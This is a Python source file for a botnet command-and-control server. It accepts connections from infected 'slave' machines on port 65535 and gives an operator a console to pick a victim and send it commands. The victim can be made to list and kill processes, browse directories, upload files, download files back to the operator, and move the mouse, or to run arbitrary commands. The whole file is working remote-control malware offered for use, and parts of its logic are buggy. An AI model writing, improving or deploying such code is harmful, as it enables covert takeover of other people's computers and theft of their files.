#!/usr/bin/python3

import socket       #import socket library
import sys          #import system library for parsing arguments
import os           #import os library to call exit and kill threads
import threading        #import threading library to handle multiple connections        #import queue library to handle threaded data
import time
import keyboard
import re
import select
ClientList = {}
i = 0
dir = ''
if_M = 0
class BotHandler(threading.Thread):
    def __init__(self, client, client_address):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = int(client_address[1])

    def run(self):
        while True:
            req = input(":".join(self.client_address)+"> ")
            if req == "":
                continue
            if req == "dis":
                a = BotCmd()
                a.start()
                sys.exit()
            if req == "exit":
                self.client.send(req.encode('utf-8'))
                a = BotCmd()
                a.start()
                del ClientList[self.ip + ":" + str(self.port)]
                sys.exit()
            if req == "mouse":
                while not keyboard.is_pressed('alt'):
                    self.client.send("mouse".encode('utf-8'))
                    time.sleep(0.1)
                continue
            if req == "proc":
                self.client.send("proc".encode('utf-8'))
                for i in sorted(set((self.client.recv(8192).decode('utf-8',errors='ignore')).splitlines()),key= lambda x: x.lower()):
                    if i.count(".exe"):
                        print("== " + i.lower()[:-4])
                continue
            if len(req.split(" ")) > 1:
                a = req.split(maxsplit=1)
                if a[0] == 'dir':
                    global dir
                    dir = a[1]
                if a[0] == "kill":
                    a[1] = a[1] + ".exe"
                if a[0] == "write":
                    self.client.send(a[0].encode('utf-8'))
                    if dir[-1] == '\\' or dir[-2] == ":": path = dir + a[1]
                    else: path = dir + "\\" + a[1]
                    self.client.send(path.encode('utf-8'))
                    self.client.recv(8192)
                    with open(a[1],'rb') as f:
                        self.client.send(f.read())
                    print(self.client.recv(2).decode('utf-8'))
                    continue
                if a[1].isdigit():
                    b = re.findall(r'\d+\S+\s+(.+)', recvVal.splitlines()[int(a[1]) - 1])[0]
                    self.client.send(a[0].encode('utf-8'))
                    time.sleep(0.1)
                    if dir[-1] != '\\': dir += '\\'
                    exec = dir+b
                    print(exec)
                    self.client.send(exec.encode('utf-8'))
                    if a[0] == "copy":
                        answ = self.client.recv(8192).decode('utf-8', errors='ignore')
                        answ = answ[:answ.rfind(":")]
                        file = answ.split('\\')[-1]
                        self.client.send('ok'.encode('utf-8'))
                        num = ''
                        for i in answ[1]:
                            if i.isdigit():
                                num += i
                        time.sleep(0.5)
                        with open(file, 'wb') as f:
                            self.client.settimeout(5)
                            while 1:
                                try:
                                    f.write(self.client.recv(67_108_864))
                                except:
                                    break
                        global if_M
                        if if_M:
                            with open(file, 'rb') as f:
                                content = f.read()[2636:]
                            with open(file, 'wb') as f:
                                f.write(content)
                        if_M = 1
                        self.client.settimeout(0.0)
                        continue
                    recvVal = (self.client.recv(8192).decode('utf-8', errors='ignore'))  # cpde added
                    print(recvVal)
                    continue
                for i in a:
                    self.client.send(i.encode('utf-8'))
                    time.sleep(0.1)
                recvVal = self.client.recv(8192).decode('utf-8',errors='ignore')  # cpde added
                print(recvVal)
                continue
            if req.isdigit():
                a = re.findall(r'\d+\S+\s+(.+)',recvVal.splitlines()[int(req)-1])[0]
                self.client.send('dir'.encode('utf-8'))
                time.sleep(0.1)
                if dir[-1] != '\\':dir += '\\'
                dir+=a
                print(dir)
                self.client.send(dir.encode('utf-8'))
                recvVal = (self.client.recv(8192).decode('utf-8', errors='ignore'))  # cpde added
                print(recvVal)
                continue
            if req == "-":
                self.client.send('dir'.encode('utf-8'))
                time.sleep(0.1)
                point = dir.rfind("\\")
                new = dir[:point]
                if not new: new = '\\'
                dir = new
                print(dir)
                self.client.send(new.encode('utf-8'))
                recvVal = (self.client.recv(8192).decode('utf-8', errors='ignore'))  # cpde added
                print(recvVal)
                continue
            try:
                self.client.send(req.encode('utf-8'))
                recvVal = (self.client.recv(8192).decode('utf-8',errors='ignore'))  # cpde added
                print(recvVal)  # code added
            except Exception as ex:
                print(ex)
class BotCmd(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            SendCmd = str(input("BotCmd> ")).split(" ")
            if (SendCmd[0] == ""):
                pass
            elif (SendCmd[0] == "exit"):
                time.sleep(0.1)
                os._exit(0)
            elif (SendCmd[0] == "exec"):
                time.sleep(0.1)
            elif (SendCmd[0] == "con"):
                address = list(ClientList.keys())[int(SendCmd[1])-1]
                adr_set = tuple(address.split(":"))
                a = BotHandler(ClientList[address],adr_set)
                a.start()
                sys.exit()
            elif (SendCmd[0] == "list"):
                print(list(ClientList.keys()))
                time.sleep(0.1)
            elif (SendCmd[0] == "disall"):
                for i in list(ClientList.keys()):
                    ClientList[i].send("exit".encode('utf-8'))
                    del ClientList[i]
            else:
                time.sleep(0.1)

def listener(lhost, lport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(200)

    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    while True:
        (client, client_address) = server.accept()
        print("[*] Slave " + client_address[0] + ":" + str(client_address[1]) + " connected!")
        ClientList[client_address[0] + ":" + str(client_address[1])] = client
        global i
        if i == 0:
            BotCmdThread = BotCmd()
            BotCmdThread.start()
            i += 1
def main():
        try:
            lhost = "0.0.0.0"
            lport = 65535
            listener(lhost, lport)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()